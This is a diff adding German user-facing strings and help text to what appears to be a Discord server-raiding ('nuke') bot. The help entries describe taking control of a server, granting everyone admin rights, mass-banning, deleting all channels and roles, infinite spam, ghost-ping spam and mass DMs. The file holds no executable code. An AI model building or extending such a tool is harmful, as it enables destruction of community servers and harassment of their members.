@@ -1,4 +1,15 @@
 {
+  "config_not_found": "Fehler: config.json nicht gefunden!",
+  "config_create_instruction": "Bitte erstellen Sie eine config.json-Datei mit Ihrem Bot-Token und Ihrer Eigentümer-ID.",
+  "config_example": "Beispiel: {\"token\": \"BOT_TOKEN\", \"prefix\": \".!\", \"owner_id\": \"IHRE_BENUTZER_ID\", \"whitelist\": [], \"language\": \"de\"}",
+  "config_invalid_json": "Fehler: config.json ist kein gültiges JSON!",
+  "token_not_found": "Fehler: Token nicht in config.json gefunden!",
+  "token_add_instruction": "Bitte fügen Sie Ihr Bot-Token und Ihre Eigentümer-ID zu config.json hinzu",
+  "token_example": "Beispiel: {\"token\": \"BOT_TOKEN\", \"prefix\": \".!\", \"owner_id\": \"IHRE_BENUTZER_ID\", \"whitelist\": []}",
+  "token_loaded": "[CONFIG] Bot-Token aus config.json geladen",
+
+  "ready_online": "[BEREIT] {bot_user} ist jetzt online!",
+  "ready_bot_id": "[BEREIT] Bot-ID: {bot_id}",
   "bot_started": "BOT GESTARTET - {bot_user} (ID: {bot_id}) | Verbunden mit {guild_count} Server(n): {guild_list}",
   "bot_prefix": "Bot-Präfix: {prefix} | Besitzer-ID: {owner_id}",
   "bot_shutdown": "BOT HERUNTERFAHREN - Eingeleitet von: {user} (ID: {user_id}) | Server: {guild} (ID: {guild_id})",
@@ -57,9 +68,9 @@
   "god_all_initiated": "👑 GOTT-MODUS FÜR ALLE EINGELEITET 👑\nGebe allen Mitgliedern Administratorrechte...",
   "god_all_complete": "Gott-Modus aktiviert für {count} Mitglieder",
 
-  "nuke_starting": "Starte nuke-all Operation... Dies kann eine Weile dauern.",
-  "nuke_complete": "Nuke-all abgeschlossen: {channels} Kanäle, {categories} Kategorien, {roles} Rollen gelöscht",
-  "nuke_no_permission": "Ich habe keine Berechtigung, die nuke-all Operation durchzuführen!",
+  "nuke_all_starting": "Starte nuke-all Operation... Dies kann eine Weile dauern.",
+  "nuke_all_complete": "Nuke-all abgeschlossen: {channels} Kanäle, {categories} Kategorien, {roles} Rollen gelöscht",
+  "nuke_all_no_permission": "Ich habe keine Berechtigung, die nuke-all Operation durchzuführen!",
 
   "delchannel_success": "#{channel} gelöscht",
   "delchannel_no_permission": "Ich habe keine Berechtigung, diesen Kanal zu löschen!",
@@ -88,8 +99,8 @@
   "brainfuck_no_permission": "Ich habe keine Berechtigung, den BRAINFUCK-Befehl auszuführen!",
 
   "spam_infinite_started": "⚠️ UNENDLICHER SPAM-MODUS AKTIVIERT ⚠️\nSpam in allen Kanälen: \"{message}\"\n\nDies wird auf unbestimmte Zeit fortgesetzt!",
-  "spam_started": "Spam gestartet: Sende \"{message}\" {count} mal in jedem Kanal...",
-  "spam_complete": "Spam abgeschlossen: {total} Nachrichten in {channels} Kanälen gesendet",
+  "spam_starting": "Spam gestartet: Sende \"{message}\" {count} mal in jedem Kanal...",
+  "spam_complete": "Spam abgeschlossen: {sent} Nachrichten in {channels} Kanälen gesendet",
   "spam_no_permission": "Ich habe keine Berechtigung, Nachrichten in Kanälen zu senden!",
 
   "rename_server_success": "Server umbenannt in **{name}**",
@@ -112,7 +123,7 @@
   "nick_no_permission": "Ich habe keine Berechtigung, den Nickname von {member} zu ändern!",
 
   "nick_all_starting": "Starte nick-all Operation... Setze alle Nicknames auf \"{nickname}\"",
-  "nick_all_complete": "Nick-all abgeschlossen: {success} Nicknames geändert, {failed} fehlgeschlagen",
+  "nick_all_complete": "Nick-all abgeschlossen: {count} Nicknames geändert, {failed} fehlgeschlagen",
   "nick_all_no_permission": "Ich habe keine Berechtigung, Nicknames zu ändern!",
 
   "role_spam_starting": "Starte role-spam Operation... Erstelle {count} Rollen namens \"{name}\"",
@@ -139,19 +150,19 @@
   "shuffle_channels_complete": "Shuffle-channels abgeschlossen: {count} Kanäle neu angeordnet",
   "shuffle_channels_no_permission": "Ich habe keine Berechtigung, Kanäle zu verwalten!",
 
-  "voice_scatter_starting": "Starte voice-scatter Operation... Verteile {count} Benutzer auf {channels} Kanäle.",
-  "voice_scatter_complete": "Voice-scatter abgeschlossen: {moved} Benutzer verschoben",
+  "voice_scatter_starting": "Starte voice-scatter Operation... Verteile {users} Benutzer auf {channels} Kanäle.",
+  "voice_scatter_complete": "Voice-scatter abgeschlossen: {count} Benutzer verschoben",
   "voice_scatter_need_channels": "Benötige mindestens 2 Sprachkanäle um Benutzer zu verteilen!",
   "voice_scatter_no_users": "Keine Benutzer in Sprachkanälen!",
   "voice_scatter_no_permission": "Ich habe keine Berechtigung, Mitglieder zu verschieben!",
 
-  "move_all_starting": "Starte move-all Operation... Verschiebe {count} Benutzer nach {channel}.",
-  "move_all_complete": "Move-all abgeschlossen: {moved} Benutzer nach {channel} verschoben",
+  "move_all_starting": "Starte move-all Operation... Verschiebe {users} Benutzer nach {channel}.",
+  "move_all_complete": "Move-all abgeschlossen: {count} Benutzer nach {channel} verschoben",
   "move_all_no_users": "Keine Benutzer in Sprachkanälen!",
   "move_all_no_permission": "Ich habe keine Berechtigung, Mitglieder zu verschieben!",
 
   "mention_spam_starting": "Starte mention-spam Operation... Sende {count} Erwähnungen.",
-  "mention_spam_complete": "Mention-spam abgeschlossen: {sent} Erwähnungen gesendet",
+  "mention_spam_complete": "Mention-spam abgeschlossen: {count} Erwähnungen gesendet",
   "mention_spam_invalid_count": "Bitte gib eine positive Zahl an!",
   "mention_spam_too_many": "Maximum 100 Erwähnungen auf einmal!",
   "mention_spam_no_permission": "Ich habe keine Berechtigung, Nachrichten zu senden oder zu erwähnen!",
@@ -167,6 +178,70 @@
 
   "shutdown_message": "Bot wird heruntergefahren",
   "shutdown_farewell": "🔴 Bot wird heruntergefahren...",
+  "shutdown_initiated": "[HERUNTERFAHREN] Bot-Herunterfahren eingeleitet von {user}",
+  "shutdown_now": "[HERUNTERFAHREN] Bot wird jetzt heruntergefahren...",
+
+  "help_footer": "Seite {page}/{total} • Verwende die Schaltflächen zum Navigieren",
+
+  "help_page1_title": "🔥 Bot-Befehle - Hauptmacht 🔥",
+  "help_page1_desc": "Wichtigste Befehle zur Übernahme der Kontrolle",
+  "help_god": "Gib dir selbst die Administratorrolle",
+  "help_god_all": "Gib ALLEN Administratorrechte",
+  "help_death": "☠️ Ultimative Zerstörung - Alle bannen, alle Kanäle und Rollen löschen",
+  "help_brainfuck": "🔥 Alle Kanäle löschen, unendlich erstellen und spammen",
+  "help_help": "Diese Hilfenachricht anzeigen",
+
+  "help_page2_title": "Bot-Befehle - Moderation",
+  "help_page2_desc": "Grundlegende Moderationsbefehle",
+  "help_ban": "Einen Benutzer vom Server bannen",
+  "help_unban": "Einen Benutzer anhand seiner ID entbannen",
+  "help_kick": "Einen Benutzer vom Server kicken",
+  "help_mute": "Einen Benutzer stummschalten (z.B. 10m, 1h, 1d)",
+  "help_unmute": "Stummschaltung eines Benutzers aufheben",
+
+  "help_page3_title": "Bot-Befehle - Massenmoderation",
+  "help_page3_desc": "Massenmoderationsbefehle",
+  "help_ban_all": "Alle Mitglieder auf dem Server bannen",
+  "help_kick_all": "Alle Mitglieder vom Server kicken",
+  "help_mute_all": "Alle Mitglieder auf dem Server stummschalten",
+  "help_purge": "Eine Anzahl von Nachrichten aus dem Kanal löschen",
+
+  "help_page4_title": "Bot-Befehle - Destruktiv",
+  "help_page4_desc": "⚠️ Befehle, die permanenten Schaden verursachen",
+  "help_nuke": "Kanal löschen und neu erstellen, um alle Nachrichten zu löschen",
+  "help_nuke_all": "ALLE Kanäle, Kategorien und Rollen löschen",
+  "help_delchannel": "Einen bestimmten Kanal löschen",
+  "help_webhook_nuke": "Alle Webhooks auf dem Server löschen",
+  "help_emoji_nuke": "Alle benutzerdefinierten Emojis löschen",
+
+  "help_page5_title": "Bot-Befehle - Trolling",
+  "help_page5_desc": "Lustige, nervige Befehle (größtenteils reversibel)",
+  "help_nick_all": "Nickname von allen setzen",
+  "help_shuffle_channels": "Alle Kanäle zufällig neu ordnen",
+  "help_voice_scatter": "Benutzer über Sprachkanäle verteilen",
+  "help_move_all": "Alle Benutzer in einen Sprachkanal verschieben",
+  "help_mention_spam": "Geister-Ping-Spam (max 100)",
+
+  "help_page6_title": "Bot-Befehle - Serververwaltung",
+  "help_page6_desc": "Befehle zur Serveranpassung",
+  "help_rename_server": "Den Server umbenennen",
+  "help_server_icon": "Das Serversymbol ändern",
+  "help_server_banner": "Serverbanner ändern (Boost Level 2+)",
+  "help_server_desc": "Serverbeschreibung ändern",
+  "help_nick": "Nickname eines Benutzers ändern",
+
+  "help_page7_title": "Bot-Befehle - Rollen & Spam",
+  "help_page7_desc": "Rollenverwaltungs- und Spam-Befehle",
+  "help_role_spam": "Rollen massenhaft erstellen",
+  "help_strip": "Alle Rollen von einem Benutzer entfernen",
+  "help_spam": "Nachricht in allen Kanälen spammen (0 = unendlich)",
+
+  "help_page8_title": "Bot-Befehle - Nützliches & DM",
+  "help_page8_desc": "Nützliche und Messaging-Befehle",
+  "help_dm": "Einen bestimmten Benutzer per DM anschreiben",
+  "help_dmall": "Alle Benutzer auf dem Server per DM anschreiben",
+  "help_serverinfo": "Detaillierte Serverinformationen abrufen",
+  "help_shutdown": "Bot herunterfahren (Nur Administrator)",
 
   "error_occurred": "Ein Fehler ist aufgetreten: {error}"
 }
